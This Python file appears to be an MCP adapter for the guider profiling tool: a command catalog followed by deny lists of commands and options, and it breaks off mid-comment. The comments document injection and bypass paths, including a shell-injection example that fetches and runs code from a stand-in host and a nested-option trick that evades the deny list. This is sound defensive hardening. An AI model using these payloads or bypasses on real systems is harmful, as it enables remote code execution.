        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show differences between exactly two directories (or a saved printdir snapshot)",
        "main_arg_name": "dirs",
        "main_arg_desc": "comma-separated pair of directory paths, e.g. '/data, /tmp'",
        "examples": ["guider dirdiff \"/data, /tmp\" -J", "guider dirdiff \"/data, /tmp\" -a -q SORT:SIZE -J"],
    },
    "less": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print a file's contents through a pager-like viewer",
        "examples": ["guider less -I a.out"],
    },
    "print": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print target files, including content inside compressed archives",
        "examples": ["guider print -I a.out, a.tar, a.zip", "guider print -I \"a.out, test*.txt\" -q HEAD:100"],
    },
    "printdir": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show a directory's structure/size, optionally with attributes and filters",
        "main_arg_name": "dir_path",
        "main_arg_desc": "target directory path",
        "examples": ["guider printdir / -J", "guider printdir / -a -J"],
    },
    "printext": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show ext4 inode attributes from a specific device file",
        "main_arg_name": "device_path",
        "main_arg_desc": "block device path, e.g. '/dev/sda1'",
        "examples": ["guider printext /dev/sda1", "guider printext /dev/sda1 -g data"],
    },
    "fadvise": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Predeclare a file-access pattern via posix_fadvise (RANDOM/SEQUENTIAL/WILLNEED/DONTNEED/NOREUSE)",
        "main_arg_name": "path_advice",
        "main_arg_desc": "'FILEPATH:ADVICE' (e.g. '/home/iipeace/a.out:DONTNEED')",
        "examples": ["guider fadvise /home/iipeace/a.out:DONTNEED", "guider fadvise /home/iipeace/a.out:WILLNEED"],
    },
    "readahead": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Initiate file readahead into page cache from a readahead list file",
        "main_arg_name": "list_file",
        "main_arg_desc": "path to a readahead list file",
        "examples": ["guider readahead readahead.list"],
    },

    # ------------------------------------------------------------------ #
    #  runCommand / androidPerf (util category — system/Android reports)  #
    # ------------------------------------------------------------------ #
    "mnttree": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show a process's mount namespace as a tree (root is only skipped when targeting guider's own PID; any explicit target argument triggers the root check)",
        "main_arg_name": "target",
        "main_arg_desc": "PID|COMM to inspect; leave empty to show guider's own mount tree",
        "examples": ["guider mnttree -J", "guider mnttree 1 -J"],
    },
    "sync": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Commit filesystem caches to disk (sync(2), or fsync(2) per file if a target is given)",
        "main_arg_name": "paths",
        "main_arg_desc": "comma-separated file paths to fsync individually; leave empty for a full system sync",
        "examples": ["guider sync", "guider sync \"TEST,TEST2\""],
    },
    "flush": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Drop page/slab caches (reversible, non-destructive) or evict a specific file/PID's cached pages",
        "main_arg_name": "level_or_path",
        "main_arg_desc": "'1'=page cache, '2'=slab cache, '3'=both (default), or a file path; use -I <PID|COMM> to flush a process's mapped/open files instead",
        "examples": ["guider flush", "guider flush 3", "guider flush -I \"*systemd*\""],
    },
    "printinfo": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show a system general info summary",
        "examples": ["guider printinfo -J"],
    },
    "printkconf": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print kernel build config (from /proc/config.gz or /boot/config-*; no JSON support)",
        "main_arg_name": "config_filter",
        "main_arg_desc": "wildcard filter on CONFIG_* names (e.g. 'CONFIG_BPF*'); leave empty for all",
        "examples": ["guider printkconf \"CONFIG_BPF*\"", "guider printkconf -I /boot/config-4.4.0-210-generic"],
    },
    "getprop": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Get an Android system property value",
        "main_arg_name": "prop_name",
        "main_arg_desc": "property name or wildcard (e.g. 'init.test.*')",
        "examples": ["guider getprop \"ro.build.*\""],
    },
    "watchprop": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": (
            "Watch Android system properties for changes in real time. IMPORTANT: guider does NOT bound its own "
            "runtime by -R — confirmed by live testing to keep running past the given duration, so always call "
            "with an explicit outer duration/timeout on the caller side."
        ),
        "main_arg_name": "prop_spec",
        "main_arg_desc": "property name/wildcard, optionally '|value1++value2' to match only specific values (e.g. 'test|done++finish')",
        "examples": ["guider watchprop \"*test\" -R 10s"],
    },
    "bugrep": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Generate a full Android bugreport archive for debugging",
        "main_arg_name": "out_path",
        "main_arg_desc": "optional output directory/file path; leave empty for the default location",
        "examples": ["guider bugrep", "guider bugrep /data/local/tmp/test"],
    },
    "scrrec": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Record the Android display to an mp4 file",
        "examples": ["guider scrrec -o /data/output.mp4", "guider scrrec -q VIDEOTIMELIMIT:60"],
    },
    "printboot": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": False,
        "description": "Print boot-time process/timing info (works cross-platform; Android boot props are optional and it falls back to generic process boot data on Linux)",
        "examples": ["guider printboot -J", "guider printboot -q SORT:cpu -J"],
    },

    # ------------------------------------------------------------------ #
    #  runCommand (util category — network/IPC/systemd/misc-report)       #
    # ------------------------------------------------------------------ #
    "ping": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Send ICMP ECHO_REQUEST to network hosts. IMPORTANT: without -R, this repeats INFINITELY (count=sys.maxsize) — always pass an explicit duration/-R",
        "main_arg_name": "targets",
        "main_arg_desc": "IP/hostname, comma-list, or wildcard range (e.g. '192.168.1.*' or '192.168.1.10-250')",
        "examples": ["guider ping www.google.com -R 3 -J", "guider ping \"192.168.1.*\" -R 5s -J"],
    },
    "req": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Send an HTTP request and print the result (no JSON support)",
        "main_arg_name": "request_spec",
        "main_arg_desc": "'METHOD#http://host:port' or plain 'http://host:port' (e.g. 'GET#http://127.0.0.1:5000')",
        "examples": ["guider req http://127.0.0.1:5000", "guider req POST#DATA:\"data\"#http://127.0.0.1:5000"],
    },
    "watch": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": (
            "Watch files/directories for inotify events in real time (-J genuinely emits one JSON object per "
            "event). IMPORTANT: guider does NOT bound its own runtime by -R — the loop runs forever until the "
            "process is killed, so always call with an explicit outer duration. Also attempts to raise "
            "/proc/sys/fs/inotify/max_user_instances to 8192 on start; root is NOT required for this to work — "
            "confirmed via source (SysMgr.writeFile() swallows the PermissionError internally and returns False "
            "instead of raising) and live testing: without root it just keeps the existing (lower) instance "
            "limit and continues watching normally, it does not hard-fail"
        ),
        "main_arg_name": "path_spec",
        "main_arg_desc": "path/glob to watch, optionally 'PATH:EVENT:FILE:CMD' (e.g. '*.txt')",
        "examples": ["guider watch /tmp -R 10s -J"],
    },
    "fetop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": (
            "Monitor files/directories for inotify events in real time — the 'top' (aggregated-table) display "
            "variant of the same watcher used by 'watch' (both dispatch to SysMgr.doWatch(); -J genuinely emits "
            "one JSON object per event). IMPORTANT: guider does NOT bound its own runtime by -R — the loop runs "
            "forever until the process is killed, so always call with an explicit outer duration. Also attempts "
            "to raise /proc/sys/fs/inotify/max_user_instances to 8192 on start; root is NOT required for this to "
            "work — confirmed via source (SysMgr.writeFile() swallows the PermissionError internally and returns "
            "False instead of raising) and live testing: without root it just keeps the existing (lower) instance "
            "limit and continues watching normally, it does not hard-fail"
        ),
        "main_arg_name": "path_spec",
        "main_arg_desc": "path/glob to watch, optionally 'PATH:EVENT:FILE:CMD' (e.g. '*.txt')",
        "examples": ["guider fetop /tmp -R 10s -J"],
    },
    "systop": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "ftraceProfile",
        "semaphore": False,
        "android_only": False,
        "description": (
            "Per-syscall latency/count top for a specific thread via ptrace (Debugger mode=\"syscall\", NOT "
            "ftrace despite the ftraceProfile grouping — grouped here for consistency with sibling ptrace-based "
            "commands btop/kstop). Root is required only when attaching to an already-running -g <TID|COMM>; "
            "launching its own child command (e.g. 'guider systop ls') does not require root"
        ),
        "examples": ["guider systop -g <pid>", "guider systop ls -R 2"],
    },
    "systat": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print a system status snapshot",
        "examples": ["guider systat -J"],
    },
    "topdiff": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Diff two or more saved 'top' report files",
        "main_arg_name": "files",
        "main_arg_desc": "comma-separated file paths or glob (e.g. 'tc1.out, tc2.out' or 'tc*.out')",
        "examples": ["guider topdiff \"tc1.out, tc2.out\" -J"],
    },
    "topsum": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Summarize one or more saved 'top' report files",
        "main_arg_name": "files",
        "main_arg_desc": "file path(s) or glob (e.g. 'output*.out')",
        "examples": ["guider topsum output.out -J"],
    },
    "printenv": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print environment variables of a process (root is only skipped when no target argument is given at all, which never applies when called via MCP)",
        "main_arg_name": "target",
        "main_arg_desc": "PID or COMM name",
        "examples": ["guider printenv a.out -J", "guider printenv -g 1234 -J"],
    },
    "printconn": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show a real-time IPC connection graph (pipe/socket) of processes via /proc/fd. -J is accepted in help but has no effect — printDepTree always prints a text tree",
        "main_arg_name": "focus_pid",
        "main_arg_desc": "optional PID to center the graph on; leave empty for the whole system",
        "examples": ["guider printconn", "guider printconn 1234"],
    },
    "printdbus": {
        "requires_root": True,
        "output_type": "json",
        "streaming": True,
        "default_duration": "5s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Snoop D-Bus messages in real time",
        "examples": ["guider printdbus -R 5s -J"],
    },
    "printdbusintro": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print D-Bus introspection data",
        "examples": ["guider printdbusintro -J"],
    },
    "printdbusstat": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print D-Bus statistics",
        "examples": ["guider printdbusstat -J"],
    },
    "printdbussub": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print D-Bus signal subscription info",
        "examples": ["guider printdbussub -J"],
    },
    "printsdfile": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print systemd unit file contents (Linux/systemd only; no JSON support despite similar sibling commands)",
        "main_arg_name": "unit_filter",
        "main_arg_desc": "unit name filter (e.g. 'test'); leave empty for all",
        "examples": ["guider printsdfile", "guider printsdfile -g test"],
    },
    "printsdinfo": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print systemd info (via D-Bus; Linux/systemd only)",
        "examples": ["guider printsdinfo -J"],
    },
    "printsdunit": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print systemd unit status list (via D-Bus; Linux/systemd only)",
        "examples": ["guider printsdunit -J"],
    },
}

# ---------------------------------------------------------------------------
# Commands that are BLOCKED from MCP exposure
# ---------------------------------------------------------------------------
BLOCKED_COMMANDS: set = {
    # System control / destructive
    "kill", "tkill", "freeze", "pause", "hook", "cgroup",
    "swapout", "limitcpu", "limitcpuset", "limitcpuw", "limitmem",
    "limitmemsoft", "limitpid", "limitread", "limitwrite",
    "setafnt", "setcpu", "setsched", "setprop", "sysrq", "exec",
    # prlimit()-based DoS primitive: mutation form ("-g TID:RTYPE:SLIM:HLIM")
    # sets arbitrary RLIMIT_* (e.g. RLIMIT_CPU) on any target PID
    "rlimit",
    # ptrace-based code injection/execution inside an arbitrary target thread
    # (-c SYM|ADDR:CMD) — a strictly stronger primitive than kill. NOT the same
    # concern as the "remote command whitelist" mentioned below under
    # server/cli (that's guider's own IPC command bus); this is local ptrace.
    "remote",
    # LLM loop prevention. Note: "askai"/"askrun"/"aiperiodic" are not actual
    # guider.py top-level commands (they're -q option keys, see BLOCKED_OPTS
    # below) — listed here defensively/redundantly so a future cleanup of
    # this set doesn't mistake BLOCKED_OPTS as the only enforcement point.
    "ask", "chat", "embed", "rag",
    "askai", "askrun", "aiperiodic",
    # Smoke-test meta-command: launches every registered command in turn,
    # including the destructive ones above, without confirmation
    "cmdtest",
    # Guider's own client/server IPC protocol — unauthenticated by default
    # (AUTHCOMM/AUTHCMDLINE/AUTHUSER/AUTHGROUP/AUTHGROUPS are opt-in), and the
    # remote command whitelist lets a client os.kill() arbitrary PIDs with no
    # ALLOWRUN-style gate (unlike "run", which does require ALLOWRUN)
    "server", "cli",
    # HTTP/TCP file server: binds 0.0.0.0 by default with no auth, serves the
    # entire target directory tree to any network peer
    "fserver",
    # Custom HTTP server whose "graph" endpoint makes guider originate a
    # connection to an attacker-supplied ip/port query param (SSRF pivot)
    "hserver",
    # Sends raw UDP/TCP packets to a caller-specified IP:PORT — network probe/
    # flood primitive with no legitimate MCP use case
    "send",
    # Event/remote-control bus: CMD_ASKRUN/CMD_AUTOSIGNAL/CMD_AUTOSWAPOUT etc.
    # can kill, OOM-adjust, or resource-limit an arbitrary target process
    "event",
    # start/stop send SIGINT via sendSignalProcs(), which — when given an
    # explicit PID argument — signals that PID unconditionally without
    # verifying it belongs to a guider process
    "start", "stop",
    # Raw mount(2)/umount2(2) syscall wrappers (SysMgr.mount/SysMgr.umount) —
    # arbitrary device/target/flags including REMOUNT/RDONLY/force-unmount,
    # with no checkRootPerm() gate in the Python wrapper itself (only the
    # kernel's CAP_SYS_ADMIN check protects it). Filesystem-mutating and
    # unbounded; no legitimate MCP use case.
    "mount", "umount",
}

# ---------------------------------------------------------------------------
# Extra -q options that are BLOCKED for security
# ---------------------------------------------------------------------------
BLOCKED_OPTS: set = {
    # LLM loop
    "ASKAI", "ASKRUN", "AIPERIODIC", "LLMPROVIDER", "LLMMODEL",
    # LLMPERIOD is a plain alias for AIPERIODIC (LLMMgr._initPeriodicAI()
    # reads "AIPERIODIC or LLMPERIOD") - without this, "-q LLMPERIOD:5" on
    # ANY allowed command (e.g. plain "top") arms the periodic-AI trigger
    # loop with no other precondition, fully bypassing the AIPERIODIC block
    "LLMPERIOD",
    # Global switch gating RUN/KILL/TERM/AUTOSIGNAL event-command execution
    # (checked via bare "ALLOWRUN" in SysMgr.environList) - appending this
    # to any allowed command's extra_opts silently upgrades any pre-existing
    # admin-configured threshold/EVENTCMD/ASKRUN automation from advisory-
    # only into live arbitrary process kill/exec for the rest of the process
    "ALLOWRUN",
    # Feeds _validateLLMCommand()'s extraAllow whitelist - an unconditional
    # bypass of the normal LLM-command allowlist, independent of ALLOWRUN
    "LLMALLOWCMD",
    # Same exfiltration/SSRF rationale that already justifies blocking
    # LLMPROVIDER/LLMMODEL above - redirects the outbound LLM endpoint and
    # injects an attacker-chosen credential into any triggered LLM call
    "LLMCUSTOM_API_KEY", "LLMCUSTOM_BASE_URL",
    # Arbitrary-path JSONL append-write primitive: _llmAuditLog() does
    # SysMgr.writeFile(logPath, ..., append=True) with zero path validation,
    # and this key name contains none of FILE/PATH/DIR so it also bypasses
    # _filter_opts()'s separate path-traversal check for other path options
    "LLMAUDITLOG",
    # Command execution
    "EXITCMD", "PRINTCMD",
    # File manipulation
    "DUPOUTPATH", "OUTFILEUSER", "OUTFILEPERM",
    # Arbitrary process/command execution (createCmdProcess/createProcess or a
    # nested guider.py re-exec that fully bypasses this filter)
    "RUNCMDLIST", "EVENTCMD", "GUIDERCMD", "WATCHLOGCMD",
    # round 68: _runCmdList() (shared by bugrep/bugrec's doBugRecord()) does
    # Popen(cmd.split(), ...) on these with zero validation — argv[0] itself
    # is attacker-controlled, same severity as sperf's round-67 finding
    "STARTCMDLIST", "STARTCMD", "ENDCMDLIST", "ENDCMD",
    # round 68: runVehicleCmd() appends this to a fixed `dumpsys` argv and
    # executes it (execvp, no shell) — narrower than STARTCMDLIST (binary is
    # fixed) but independently settable via andcmd's -q options, so it
    # bypasses _ANDCMD_ALLOWED_SUBCOMMANDS entirely (that allowlist only
    # restricts the positional sub_command/main_arg, not these -q options)
    "VHALCMD", "CSCMD",
    # round 69: doBugRecord()'s bugrec-only (dump=False) branch builds
    # `cmd = tcpdumpOpts` verbatim from this and runs it via
    # createCmdProcess() — argv[0] itself is attacker-controlled, same
    # severity as STARTCMDLIST above. (TCPDUMPFILESIZEMB/TCPDUMPFILECNT
    # are separately coerced through UtilMgr.getEnvironNum() and are
    # numeric-only, so they're not injection vectors and aren't listed here)
    "TCPDUMP",
    # round 69: same doBugRecord() branch builds ["sperf"]/["hprof"] +
    # value.split("|") and runs it via SysMgr.launchGuider(), which forks
    # and calls main(cmd) IN-PROCESS — this never re-enters
    # guider_adapter.py, so it completely bypasses sperf's own
    # _REQUIRES_DEVICE_ID_COMMANDS block (round 67) via a totally separate,
    # unrelated option
    "CPUPROF", "MEMPROF",
    # round 70: tool-path options meant for a human operator to configure
    # once in guider.conf — not something an MCP/REST caller legitimately
    # needs to override per-call. Each becomes argv[0] (or a dlopen target
    # for LIBDLT/LIBLLVM) with weak-to-zero validation: PERFETTO/SIMPLEPERF/
    # TRACECONV/SCREENCAP/OATDUMP have NO check at all before exec; ADDR2LINE/
    # OBJDUMP only check os.path.isfile() (existence, not identity — e.g.
    # "/bin/sh" passes that check trivially, so it's not a real control).
    # LIBDLT/LIBLLVM are dlopen'd rather than exec'd, but a shared library's
    # constructor runs on load, so it's the same "attacker-chosen code runs"
    # outcome via a different primitive. Same rationale as blocking
    # LLMPROVIDER/LLMMODEL/LLMCUSTOM_BASE_URL in round 58.
    "PERFETTO", "SIMPLEPERF", "TRACECONV", "SCREENCAP", "OATDUMP",
    "ADDR2LINE", "OBJDUMP", "LIBDLT", "LIBLLVM",
    # round 76: TRACEPROCESSOR is the exact same argv[0]-with-zero-validation
    # primitive as the group above (AndroidMgr._runTraceProcessor(), used by
    # perfetto's -q SQL:/METRIC:/QUERY: trace-analysis path) but was missed
    # from round 70's sweep — and unlike the rest of this group, it's
    # reachable via perfetto's -I <existing file> analysis path, which needs
    # no device_id/isAndroid/android_only enforcement at all, making it a
    # full local RCE with none of those preconditions.
    "TRACEPROCESSOR",
    # round 77: three more argv[0]-with-weak-to-zero-validation options
    # found by a from-scratch re-sweep of every SysMgr.environList read in
    # guider.py (rounds 70/76's sweeps were not exhaustive). PERFBIN
    # (FuncPerfMgr.doFuncPerf()/_convertFromPerfData()) only checks
    # os.path.isfile()+os.access(X_OK) — the same "existence, not identity"
    # check round 70 already ruled insufficient for ADDR2LINE/OBJDUMP —
    # before using it as argv[0] for subprocess.Popen(); fperf is
    # requires_root=False and android_only=False, so this is reachable
    # with NO precondition at all, the same severity class as
    # TRACEPROCESSOR. LLVMSYMBOLIZER (FunctionAnalyzer.getFileSymbolInfo(),
    # only os.path.isfile()) shares the exact reachability of the
    # already-blocked ADDR2LINE (same function, same funcrec -I path) —
    # simply missed alongside it. CMD (DbusMgr.printSdInfo(), reached via
    # printsdinfo/printsdunit with json_output=False) is the weakest-
    # validated of all: os.execvpe(cmd[0], cmd, env) with no check
    # whatsoever before exec.
    "CMD", "PERFBIN", "LLVMSYMBOLIZER",
    # round 80: DESC is a fundamentally different, more severe class than
    # every other entry in this set — it's not "argv[0]/dlopen target with
    # weak validation", it's a genuine shell-metacharacter-injection
    # primitive. AndroidMgr.doBugRecord() (shared by bugrep/bugrec, already
    # in _MAIN_ARG_PATH_COMMANDS since rounds 66/68 because omitting
    # device_id runs them LOCALLY) only validates main_arg's derived
    # outPath against _is_sensitive_path()'s credential-file markers/
    # suffixes - it has no concept of shell metacharacters. When "-q DESC"
    # is given bare (no value - guider's standard flag-only convention),
    # doBugRecord() does `os.system('sh -c "echo ...; cat > %s"' %
    # descPath)` with descPath (derived from main_arg via os.path.join()/
    # realpath(), which preserve "$(...)" verbatim) interpolated
    # UNESCAPED into a double-quoted shell string - POSIX shells still
    # expand "$(...)"/backticks inside double quotes, so a main_arg like
    # "/tmp/$(curl evil|sh)" achieves full remote command execution with
    # no device_id/root/android precondition at all. Every other command-
    # execution finding in this series (sperf/hprof/perfetto's main_arg,
    # TRACEPROCESSOR/CMD/PERFBIN/etc.'s -q options) only ever let the
    # caller choose WHICH fixed-shape program runs (no shell=True
    # anywhere in the adapter's own _exec()); this is genuine shell-
    # syntax injection, a strictly worse primitive. Blocking the option
    # closes the only way an MCP/REST caller can reach the bare-DESC
    # branch, since extra_opts is the sole path -q values take.
    "DESC",
    # round 81: DYNRUNTIMEOPT/DYNUPTIMEOPT are a complete BLOCKED_OPTS
    # bypass mechanism, not just another dangerous option — guider.py's
    # own bare "-q DYNUPTIMEOPT:<time>:<nested option string>" syntax
    # (SysMgr.applyEnvironVars() queues it; SysMgr.updateEnvironVars()
    # re-parses the nested string with its OWN independent
    # UtilMgr.splitString()/convList2Dict() call once the timer fires,
    # merging straight into SysMgr.environList) never passes back through
    # _filter_opts()/BLOCKED_OPTS — only the outer DYNRUNTIMEOPT/
    # DYNUPTIMEOPT key is ever checked, never the nested option list's
    # contents. extra_opts=["DYNUPTIMEOPT:1s:-q EVENTCMD:evil"] (or any
    # other currently-blocked option/value) smuggles it in, fully
    # unvalidated, after the timer elapses — defeating every one of this
    # set's 45+ other entries at once. The nested reparse is also a
    # second, independent comma-splitting layer on top of
    # parseEnvironVars()'s own, so even a value with no malicious intent
    # (e.g. a nested option with its own comma-delimited sub-value like
    # FDCNTFILTER's two-sided range) gets corrupted by this adapter's
    # single-escape scheme - but that's a secondary concern next to the
    # complete validation bypass. Blocking the option outright is simpler
    # and more robust than trying to recursively validate an
    # arbitrary-depth nested option string.
    "DYNRUNTIMEOPT", "DYNUPTIMEOPT",
    # round 81: -q SWAPOUT gives the exact capability the standalone
    # "swapout" top-level command provides (SysMgr.doProcessSwapout(),
    # forcibly swaps out a target process's anonymous memory every
    # monitoring interval) - runSwapTop()/runTaskTop() (the shared loop
    # behind nearly every systemMonitor command: top/ttop/atop/wtop/ctop/
    # ntop/rtop/ptop/mtop/disktop/stacktop/contop) both read it directly.
    # "swapout" itself is already in BLOCKED_COMMANDS as "destructive
    # system control", but this -q option reaches the identical sink with
    # zero root/precondition on the most basic monitoring commands - a
    # clean bypass of an already-decided block.
    "SWAPOUT",
    # round 81: STDIN/STDOUT/STDERR redirect a spawned child's file
    # descriptors to a caller-chosen path with ZERO validation
    # (SysMgr.closeStdFd() -> SysMgr.redirectFd(): os.open(path,
    # O_RDWR|O_CREAT|O_APPEND) + os.dup2(), no _is_sensitive_path()/
    # existence check at all - the option names contain none of
    # FILE/PATH/DIR so even the generic heuristic misses them). Reachable
    # via mkcache (requires_root=False, parallel-by-default) with a
    # running PID/comm as main_arg, whose per-mapped-library child
    # process init path calls closeStdFd() unconditionally. No legitimate
    # MCP/REST use case for remotely rewiring a spawned guider child's
    # stdio.
    "STDIN", "STDOUT", "STDERR",
    # round 81: SETDEBUG/CLEARDEBUG (AndroidMgr.doPerfetto(), shared by
    # andcmd/hprof/perfetto) and SETSETTINGS (AndroidMgr.writeSetting())
    # all %-format an unvalidated option value into a command string
    # that's then .split() and exec'd with no shell (so not the DESC
    # class of full shell injection) but WITH no escaping - a space in
    # the value injects extra argv tokens into "am set-debug-app -w
    # <pkg>"/"settings put <ns> <name>", letting a caller smuggle
    # additional flags (e.g. "--user <id>") into Android's own am/
    # settings tools. Lower severity than DESC (no shell metacharacter
    # interpretation, just argument injection into a fixed argv[0]), but
    # the same "value read via SysMgr.environList reaches a re-parsed,
    # unescaped sink" root cause this round's sweep specifically targeted.
    "SETDEBUG", "CLEARDEBUG", "SETSETTINGS",
    # round 82: same class as round 81's SWAPOUT - a -q option reaching
    # the IDENTICAL sink function an already-blocked top-level command
    # uses, via a completely different (unblocked) trigger point.
    # limitcpu/limitcpuw/limitcpuset/limitmem/limitmemsoft/limitread/
    # limitwrite/limitpid (all in BLOCKED_COMMANDS) call SysMgr.doLimit()
    # -> SysMgr.applyLimitVars(varList), but applyLimitVars() called with
    # NO argument (varList=None) reads these exact 8 keys straight out of
    # SysMgr.environList and reaches the identical limitCpu/limitCpuWeight/
    # limitCpuset/limitMemory/limitBlock/limitPid -> SysMgr.doCgroup()
    # sink. Worse, the no-arg call happens INSIDE SysMgr.applyEnvironVars()
    # (guider.py's common "-q" flag handler, called on any command that
    # carries a -q option at all) - an even more universal trigger than
    # SWAPOUT's (monitoring commands only). requires_root inside doCgroup()
    # checks the guider PROCESS's real OS UID, not the invoked command's
    # requires_root catalog flag, so a requires_root=False command like
    # "top" still succeeds if the MCP server itself happens to run as
    # root (a common deployment given other BPF commands already need it)
    # - the identical precondition the blocked commands themselves have,
    # just reached through an unrelated door.
    "LIMITCPU", "LIMITCPUW", "LIMITCPUSET", "LIMITMEM", "LIMITMEMSOFT",
    "LIMITREAD", "LIMITWRITE", "LIMITPID",
    # round 82: same pattern for the blocked "cgroup" command - APPLYCG
    # read with no argument inside the same applyEnvironVars() reaches
    # SysMgr.applyCgroupVars() -> SysMgr.doCgroup() with a full
    # CREATE/ADD/MOVE/REMOVE/DELETE/READ/WRITE/LIST cgroupfs primitive,
    # the exact general capability "cgroup" itself provides.
    "APPLYCG",
    # round 82: TCPSERVER/UDSSERVER reopen the exact unauthenticated
    # command channel "server"/"cli"/"hserver"/"fserver" are already
    # fully blocked in BLOCKED_COMMANDS specifically to prevent. Setting
    # either key (present-in-environList is the only precondition -
    # SysMgr.getTCPAddr()/getUDSPath()) starts NetworkMgr's TCP/UDS
    # listener from inside ANY command that reaches
    # NetworkMgr.execReceiverTask() (e.g. plain "top", via
    # TaskAnalyzer.runTaskTop()) - not just the already-blocked server/cli
    # dispatch. The connection "authorization" check
    # (AUTHCOMM/AUTHCMDLINE/AUTHUSER/AUTHGROUP/AUTHGROUPS) is a no-op
    # unless an operator has already set one of those, which none of them
    # are by default, so any local (or, for TCP, network-reachable)
    # client can connect with zero authentication once the listener is
    # up, and the client-supplied command line feeds SysMgr.reqHandler()
